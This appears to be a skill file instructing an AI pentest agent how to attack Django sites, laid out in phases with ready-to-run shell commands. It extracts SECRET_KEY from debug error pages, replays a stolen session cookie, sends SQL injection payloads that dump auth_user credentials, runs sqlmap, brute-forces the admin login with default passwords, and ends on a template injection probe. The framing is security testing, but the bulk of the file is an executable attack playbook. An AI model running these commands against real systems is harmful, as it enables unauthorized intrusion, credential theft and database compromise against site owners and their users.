---
name: framework-django
description: "Django framework security testing — admin panel exposure, DEBUG mode RCE, CSRF bypass, secret key extraction, SSTI via templates, SQL via ORM raw queries. Triggers: 'django', 'django security', 'django admin', 'django debug', 'python web framework', 'django orm injection'."
---

# Django Security Testing

Django-specific attack surface: admin panel, debug mode, secret key, SSTI, ORM injection.

## Phase 1: Fingerprinting & Admin Discovery

```bash
TARGET="https://TARGET"

curl -s "$TARGET" | grep -i "csrfmiddlewaretoken\|djdt\|django"
curl -s "$TARGET/admin/" -o /workspace/output/admin-response.html

curl -s "$TARGET/doesnotexist/" | grep -i "django\|traceback\|settings\|SECRET_KEY"

for path in /admin /django-admin /admin/login /staff /backend; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET$path/")
  echo "$code $path"
done | tee /workspace/output/admin-paths.txt
```

## Phase 2: DEBUG Mode Exploitation

```bash
curl -s "$TARGET/AAAAAAAA" | grep -oP "SECRET_KEY\s*=\s*['\"].*?['\"]"

curl -s -X INVALID "$TARGET/" | grep -i "settings\|installed_apps\|databases"

curl -s "$TARGET/__debug__/sql_select" 
curl -s "$TARGET/__debug__/render_panel"
```

## Phase 3: CSRF & Session Testing

```bash
curl -s -X POST "$TARGET/api/data/" -H "Content-Type: application/json" \
  -d '{"test":"value"}' -b "sessionid=STOLEN_SESSION"

curl -v "$TARGET/admin/login/" 2>&1 | grep "Set-Cookie\|sessionid\|csrftoken"

```

## Phase 4: ORM SQL Injection

```bash
for payload in "1 OR 1=1" "1; SELECT sleep(5)--" "1 UNION SELECT username,password FROM auth_user--"; do
  curl -s "$TARGET/search/?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")"
done

sqlmap -u "$TARGET/api/users/?id=1" --dbms=postgresql --batch \
  --headers="Cookie: csrftoken=TOKEN; sessionid=SESSION" \
  -o /workspace/output/sqlmap-django.txt
```

## Phase 5: Admin Panel Attacks

```bash
for cred in "admin:admin" "admin:password" "admin:django" "root:root"; do
  user=$(echo $cred | cut -d: -f1)
  pass=$(echo $cred | cut -d: -f2)

  csrf=$(curl -sc /tmp/cookies.txt "$TARGET/admin/login/" | grep -oP 'csrfmiddlewaretoken.*?value="\K[^"]+')
  result=$(curl -sb /tmp/cookies.txt -X POST "$TARGET/admin/login/" \
    -d "csrfmiddlewaretoken=$csrf&username=$user&password=$pass&next=/admin/" -w "%{http_code}" -o /dev/null)
  echo "$result $user:$pass"
done | tee /workspace/output/admin-bruteforce.txt

# {{ ''.__class__.__mro__[1].__subclasses__() }}
```

## Output

Save to `/workspace/output/`:
- `admin-paths.txt` — discovered admin endpoints
- `admin-response.html` — admin login page
- `sqlmap-django.txt` — SQL injection results

## Next Phase

→ `vuln-ssti` for Jinja2/Django template injection exploitation
→ `vuln-sqli` for deeper SQL injection testing
